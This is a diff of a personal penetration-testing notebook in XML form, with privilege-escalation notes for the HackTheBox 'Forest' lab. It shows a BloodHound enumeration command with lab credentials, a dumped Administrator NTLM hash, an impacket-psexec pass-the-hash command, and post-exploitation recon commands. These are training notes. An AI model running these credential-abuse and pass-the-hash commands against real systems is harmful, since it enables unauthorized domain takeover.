@@ -11273,7 +11273,7 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
 </codebox>
       </node>
-      <node name="PrivEsc" unique_id="104" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696627148" ts_lastsave="1696735451">
+      <node name="PrivEsc" unique_id="104" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696627148" ts_lastsave="1696735525">
         <rich_text>
 since we have credentials we will run the followig:
 
@@ -11309,6 +11309,9 @@ ref: </rich_text>
         <rich_text link="webs https://iammainul.medium.com/hackthebox-forest-walkthrough-90052aae5521">https://iammainul.medium.com/hackthebox-forest-walkthrough-90052aae5521</rich_text>
         <rich_text>
 
+
+
+
 </rich_text>
         <codebox char_offset="55" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">python2 /usr/bin/bloodhound-python --dns-tcp -ns 10.10.10.161 -d htb.local -u ‘svc-alfresco’ -p ‘s3rvice’ -c all</codebox>
         <codebox char_offset="90" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">svc-alfresco</codebox>
@@ -11338,6 +11341,7 @@ Impacket v0.11.0 - Copyright 2023 Fortra
 htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
 </codebox>
         <codebox char_offset="335" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec  htb.local/admin@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 </codebox>
+        <codebox char_offset="417" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">hostname &amp;&amp; whoami.exe &amp;&amp; whoami.exe /groups &amp;&amp; type root.txt &amp;&amp; ipconfig /all</codebox>
       </node>
     </node>
     <node name="Exploitation" unique_id="22" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="22" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1500474629">
